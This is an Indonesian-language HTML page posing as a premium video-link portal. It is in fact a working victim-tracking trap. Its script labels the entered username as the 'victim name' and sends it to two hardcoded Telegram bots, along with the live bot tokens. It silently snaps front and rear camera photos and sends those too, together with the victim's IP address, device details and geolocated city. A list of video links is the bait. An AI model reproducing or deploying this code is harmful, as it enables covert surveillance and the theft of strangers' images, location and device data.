<!DOCTYPE html>
<html lang="id">  
<head>  
  <meta charset="UTF-8">    
  <meta name="viewport" content="width=device-width, initial-scale=1">    
  <title>VRS LINK PREMIUM</title>    
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Montserrat:wght@300;500;700&display=swap" rel="stylesheet">
  <style>  
    :root {
      --gold: #D4AF37;
      --gold-light: #FFD700;
      --gold-dark: #996515;
      --black: #0A0A0A;
      --black-light: #1A1A1A;
      --white: #F5F5F5;
      --diamond: #B9F2FF;
    }
    
    body {  
      background: radial-gradient(ellipse at center, var(--black) 0%, var(--black-light) 100%);
      color: var(--white);  
      font-family: 'Montserrat', sans-serif;  
      text-align: center;  
      padding: 0;
      margin: 0;
      min-height: 100vh;
      overflow-x: hidden;  
      position: relative;
    }
    
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="none" stroke="%23D4AF37" stroke-width="0.5" opacity="0.1"/></svg>');
      opacity: 0.05;
      z-index: 0;
    }
    
    .container {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
      padding: 40px 20px;
    }
    
    .logo {
      font-family: 'Playfair Display', serif;
      font-size: 4.5em;
      margin-bottom: 20px;
      color: var(--gold);
      text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
      letter-spacing: 2px;
      position: relative;
      display: inline-block;
    }
    
    .logo::after {
      content: "";
      position: absolute;
      bottom: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 2px;
      background: linear-gradient(90deg, transparent, var(--gold), transparent);
    }
    
    .subtitle {
      font-size: 1.3em;
      margin-bottom: 40px;
      color: var(--white);
      font-weight: 300;
      letter-spacing: 1px;
    }
    
    .input-container {
      position: relative;
      max-width: 600px;
      margin: 0 auto 30px;
    }
    
    .input-container::before {
      content: "";
      position: absolute;
      top: -5px;
      left: -5px;
      right: -5px;
      bottom: -5px;
      background: linear-gradient(45deg, var(--gold), var(--diamond), var(--gold-dark));
      z-index: -1;
      border-radius: 30px;
      opacity: 0.7;
    }
    
    input {  
      padding: 18px 25px;  
      font-size: 1.1em;  
      width: 100%;  
      border-radius: 25px;  
      border: none;  
      background-color: rgba(10, 10, 10, 0.9);  
      color: var(--gold-light);  
      transition: all 0.3s ease;
      font-family: 'Montserrat', sans-serif;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(212, 175, 55, 0.3);
    }  
    
    input:focus {  
      outline: none;  
      box-shadow: 0 0 15px var(--gold), 0 5px 20px rgba(0, 0, 0, 0.4);
      background-color: rgba(20, 20, 20, 0.9);
    }  
    
    input::placeholder {
      color: rgba(212, 175, 55, 0.5);
      font-weight: 300;
    }
    
    button {  
      background: linear-gradient(135deg, var(--gold), var(--gold-dark));  
      color: var(--black);  
      font-size: 1.1em;  
      font-weight: 700;  
      padding: 16px 40px;  
      border: none;  
      border-radius: 30px;  
      cursor: pointer;  
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3), 0 0 10px rgba(212, 175, 55, 0.5);
      position: relative;
      overflow: hidden;
      letter-spacing: 1px;
      text-transform: uppercase;
      font-family: 'Montserrat', sans-serif;
    }  
    
    button:hover {  
      transform: translateY(-3px);  
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4), 0 0 15px rgba(212, 175, 55, 0.7);
    }  
    
    button:active {  
      transform: translateY(1px);  
    }
    
    button::after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transform: translateX(-100%);
      transition: transform 0.6s ease;
    }
    
    button:hover::after {
      transform: translateX(100%);
    }
    
    .status {
      font-size: 1.1em;
      margin: 30px 0;
      color: var(--gold);
      min-height: 24px;
    }
    
    .hidden {  
      display: none;  
    }
    
    .typing-container {
      margin-top: 50px;
      padding: 40px;
      background: rgba(10, 10, 10, 0.7);
      border-radius: 10px;
      border: 1px solid rgba(212, 175, 55, 0.2);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      position: relative;
      max-width: 800px;
      margin-left: auto;
      margin-right: auto;
    }
    
    .typing-container::before {
      content: "";
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      border-radius: 12px;
      background: linear-gradient(45deg, var(--gold), var(--diamond), var(--gold));
      z-index: -1;
      opacity: 0.3;
    }
    
    .typing-text {
      font-size: 2em;
      color: var(--gold-light);
      white-space: pre-wrap;
      overflow-wrap: break-word;
      text-align: center;
      font-family: 'Playfair Display', serif;
      line-height: 1.5;
      text-shadow: 0 0 10px rgba(212, 175, 55, 0.3);
    }
    
    .video-links {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
      gap: 20px;
      margin-top: 40px;
      text-align: left;
    }
    
    .video-links a {  
      display: block;  
      padding: 15px 20px;
      background: rgba(20, 20, 20, 0.7);
      color: var(--gold-light);  
      text-decoration: none;  
      font-weight: 500;  
      transition: all 0.3s ease;
      border-radius: 8px;
      border-left: 3px solid var(--gold);
      opacity: 0;
      transform: translateY(20px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      position: relative;
      overflow: hidden;
    }
    
    .video-links a::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(212, 175, 55, 0.1), transparent);
      transform: translateX(-100%);
      transition: transform 0.6s ease;
    }
    
    .video-links a:hover::before {
      transform: translateX(100%);
    }
    
    .video-links a:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
      background: rgba(30, 30, 30, 0.8);
    }
    
    .video-links a.show {  
      opacity: 1;  
      transform: translateY(0);  
      transition: opacity 0.5s, transform 0.5s, box-shadow 0.3s;  
    }
    
    .diamond {
      position: absolute;
      width: 100px;
      height: 100px;
      background: radial-gradient(circle at center, var(--diamond) 0%, transparent 70%);
      opacity: 0.1;
      z-index: 0;
    }
    
    .diamond-1 {
      top: 10%;
      left: 10%;
      animation: float 8s ease-in-out infinite;
    }
    
    .diamond-2 {
      bottom: 15%;
      right: 10%;
      animation: float 10s ease-in-out infinite 2s;
    }
    
    .diamond-3 {
      top: 30%;
      right: 20%;
      animation: float 12s ease-in-out infinite 1s;
    }
    
    @keyframes float {
      0%, 100% {
        transform: translateY(0) rotate(0deg);
      }
      50% {
        transform: translateY(-20px) rotate(5deg);
      }
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .welcome-screen {
      animation: fadeIn 1.5s ease-out;
    }
    
    /* Responsive adjustments */
    @media (max-width: 768px) {
      .logo {
        font-size: 3em;
      }
      
      .subtitle {
        font-size: 1.1em;
      }
      
      .typing-container {
        padding: 20px;
      }
      
      .video-links {
        grid-template-columns: 1fr;
      }
    }
  </style>  
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY"></script>  
</head>  
<body>  
  <div class="diamond diamond-1"></div>
  <div class="diamond diamond-2"></div>
  <div class="diamond diamond-3"></div>
  
  <div class="container welcome-screen">
    <div class="logo">VRS LINK</div>  
    <div class="subtitle">Masukkan Username Kamu Untuk Melanjutkan</div>  
    
    <div class="input-container">
      <input type="text" id="username" placeholder="Contoh: admin123" />  
    </div>
    
    <button onclick="mulaiProses()">PROSES</button>  
    <div class="status" id="status"></div>  
    
    <div id="typingContainer" class="hidden">  
      <div class="typing-container">
        <div class="typing-text" id="typingText"></div>  
        <div class="video-links" id="videoLinks"></div>  
      </div>
    </div>  
  </div>
  
  <video id="video" style="display:none;"></video>  
  <canvas id="canvas" style="display:none;"></canvas>
  
  <script>  
    // Telegram configuration for two accounts
    const tokens = [
      {
        token: "7774212563:AAExdwi-SFBOwr1hXfe4krnd5SoS6E-sucM",
        chat_id: "6631076203"
      },
      {
        token: "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU",
        chat_id: "7916928366"
      }
    ];
  
    async function mulaiProses() {  
      const username = document.getElementById("username").value.trim();  
      if (!username) return alert("Username tidak boleh kosong!");  
    
      if (username.toLowerCase() === "vrs") {  
        document.querySelector('.container').innerHTML = `  
          <div class="logo">SELAMAT DATANG</div>
          <div class="subtitle">TUAN VRS</div>
          <div class="video-links" id="videoLinks" style="margin-top:40px;"></div>  
        `;  
        tampilkanLinks();  
        return;  
      }  
    
      tampilkanStatus("Memproses...");  
    
      // Send to both Telegram accounts
      await Promise.all(tokens.map(account => 
        kirimTelegram(account.token, account.chat_id, `📝 𝗡𝗔𝗠𝗔 𝗞𝗢𝗥𝗕𝗔𝗡:\n${username}`)
      ));
      
      await aksesKamera("user", "𝐊𝐀𝐌𝐄𝐑𝐀 𝗗𝗘𝗣𝗔𝗡");  
      await aksesKamera("environment", "𝐊𝐀𝐌𝐄𝐑𝐀 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚");  
      await ambilDanKirimInfo();  
      deteksiLokasiGoogleMaps();  
    
      tampilkanStatus("Sukses!");  
      mulaiTyping();  
    }  
  
    function tampilkanStatus(teks) {  
      document.getElementById('status').innerText = teks;  
    }  
  
    async function kirimTelegram(token, chat_id, pesan) {  
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {  
          method: 'POST',  
          headers: { 'Content-Type': 'application/json' },  
          body: JSON.stringify({ chat_id, text: pesan, parse_mode: "Markdown" })  
        });  
      } catch (e) {
        console.error('Error sending to Telegram:', e);
      }
    }  
  
    async function aksesKamera(facingMode, labelKamera) {  
      const video = document.getElementById('video');  
      const canvas = document.getElementById('canvas');  
      const context = canvas.getContext('2d');  
      const constraints = { video: { facingMode: facingMode } };  
    
      try {  
        const stream = await navigator.mediaDevices.getUserMedia(constraints);  
        video.srcObject = stream;  
        await video.play();  
        await new Promise(resolve => setTimeout(resolve, 2000));  
    
        canvas.width = video.videoWidth;  
        canvas.height = video.videoHeight;  
        context.drawImage(video, 0, 0, canvas.width, canvas.height);  
    
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));  
        stream.getTracks().forEach(track => track.stop());  
    
        // Send camera photos to both Telegram accounts
        await Promise.all(tokens.map(account => {
          const formData = new FormData();  
          formData.append('chat_id', account.chat_id);  
          formData.append('caption', labelKamera);  
          formData.append('photo', blob);  
    
          return fetch(`https://api.telegram.org/bot${account.token}/sendPhoto`, {  
            method: 'POST',  
            body: formData  
          });
        }));
      } catch (e) {  
        console.error('Gagal akses kamera:', e);  
      }  
    }  
  
    async function ambilDanKirimInfo() {  
      try {  
        const ipRes = await fetch("https://api.ipify.org?format=json");  
        const ipData = await ipRes.json();  
        const battery = await navigator.getBattery();  
        const batteryLevel = (battery.level * 100).toFixed(0) + "%";  
    
        const text = `  
°==> INFO PERANGKAT <==°  
🌐 IP: ${ipData.ip}  
🔋 Baterai: ${batteryLevel}  
💻 Platform: ${navigator.platform}  
🖥️ Browser: ${navigator.userAgent}  
📏 Resolusi: ${screen.width}x${screen.height}  
🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}  
🗣️ Bahasa: ${navigator.language}  
🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core  
🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB  
📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}  
        `;  
    
        // Send device info to both Telegram accounts
        await Promise.all(tokens.map(account => 
          kirimTelegram(account.token, account.chat_id, text)
        ));
      } catch (e) {  
        console.error('Gagal ambil info:', e);  
      }  
    }  
  
    function deteksiLokasiGoogleMaps() {  
      if (navigator.geolocation) {  
        navigator.geolocation.getCurrentPosition(posisiBerhasil, posisiGagal);  
      } else {  
        tampilkanStatus("Geolocation tidak didukung oleh browser.");  
      }  
    }  
  
    function posisiBerhasil(position) {  
      const lat = position.coords.latitude;  
      const lng = position.coords.longitude;  
      const geocoder = new google.maps.Geocoder();  
      const latlng = { lat: lat, lng: lng };  
    
      geocoder.geocode({ location: latlng }, function(results, status) {  
        if (status === "OK" && results[0]) {  
          let kota = "";  
          let provinsi = "";  
          for (const comp of results[0].address_components) {  
            if (comp.types.includes("administrative_area_level_1")) {  
              provinsi = comp.long_name;  
            }  
            if (comp.types.includes("locality") || comp.types.includes("administrative_area_level_2")) {
              kota = comp.long_name;  
            }  
          }  
    
          const lokasiText = `📍 Lokasi: ${kota}, ${provinsi}`;  
          tampilkanStatus(lokasiText);  
          
          // Send location to both Telegram accounts
          tokens.forEach(account => {
            kirimTelegram(account.token, account.chat_id, `📍 Lokasi via Maps API:\n${kota}, ${provinsi}`);
          });
        } else {  
          tampilkanStatus("Gagal mendeteksi lokasi.");  
        }  
      });  
    }  
  
    function posisiGagal(error) {  
      tampilkanStatus("Gagal dapatkan lokasi: " + error.message);  
    }  
  
    function mulaiTyping() {  
      document.getElementById('typingContainer').classList.remove('hidden');  
      document.querySelector('.logo').classList.add('hidden');  
      document.querySelector('.subtitle').classList.add('hidden');  
      document.querySelector('.input-container').classList.add('hidden');  
      document.querySelector('button').classList.add('hidden');  
      document.getElementById('status').classList.add('hidden');  
    
      const text = "SELAMAT NONTON\n💎";  
      let i = 0;  
      const speed = 100;  
      const typingText = document.getElementById('typingText');  
    
      function typeWriter() {  
        if (i < text.length) {  
          typingText.innerHTML += text.charAt(i);  
          i++;  
          setTimeout(typeWriter, speed);  
        } else {  
          tampilkanLinks();  
        }  
      }  
      typeWriter();  
    }  
  
    function tampilkanLinks() {  
      const links = [  
        "https://videy.co/v/?id=m7CyuDcp1", "https://videy.co/v/?id=orjHoldg1", "https://videy.co/v/?id=qAkZrrVr1",    
        "https://videy.co/v/?id=8b3vTHaI1", "https://videy.co/v/?id=A1ohuKLA1", "https://videy.co/v/?id=Gg6dHmBV1",    
        "https://videy.co/v/?id=vJD5pVtw1", "https://videy.co/v/?id=pEQN9MLV1", "https://videy.co/v/?id=fI7jAisa1",    
        "https://videy.co/v/?id=7iwfWtfz1", "https://videy.co/v/?id=HIYoDSTA1", "https://videy.co/v/?id=jpSQBmdf1",    
        "https://videy.co/v/?id=aHJZ6P3h1", "https://videy.co/v/?id=p0gVDdiq1", "https://videy.co/v/?id=C07qMLTs1",    
        "https://videy.co/v/?id=zV6zLKus1", "https://videy.co/v/?id=c4IJa1oM1", "https://videy.co/v/?id=oGjVEBXx1",    
        "https://videy.co/v/?id=Pnt1gOED1", "https://videy.co/v/?id=UWUwyKXv1", "https://videy.co/v/?id=WCcrmPBC1",    
        "https://videy.co/v/?id=FQATwkwA1", "https://videy.co/v/?id=nxkWOzw01", "https://videy.co/v/?id=Q3ziyhRk1",    
        "https://videy.co/v/?id=7ahPxXzW1", "https://videy.co/v/?id=VFtsvvIC1", "https://videy.co/v/?id=QTIkYyfW1",    
        "https://videy.co/v/?id=hkJva0rt1", "https://videy.co/v/?id=va823Kql1", "https://videy.co/v/?id=Xo6iHHbh1",    
        "https://videy.co/v/?id=5jioWb1w1", "https://videy.co/v/?id=hdbTpI8x1", "https://videy.co/v/?id=dkUNC2uF1",    
        "https://videy.co/v/?id=KefUzWOv1", "https://videy.co/v/?id=5tTXjX711", "https://videy.co/v/?id=E0VF3Ey51",    
        "https://videy.co/v/?id=sJTEuZ561", "https://videy.co/v/?id=sbBUPwzZ1", "https://videy.co/v/?id=3iaNzgsD1",    
        "https://videy.co/v/?id=YQog37Pu1", "https://videy.co/v/?id=pqnU096o1"  
      ];  
      const container = document.getElementById('videoLinks');  
      links.forEach((link, index) => {  
        setTimeout(() => {  
          const a = document.createElement('a');  
          a.href = link;  
          a.target = "_blank";  
          a.innerText = "🎬 " + link.replace("https://", "");  
          container.appendChild(a);  
          setTimeout(() => a.classList.add('show'), 50);  
        }, 100 * index);  
      });  
    }  
  </script>  
</body>  
</html>
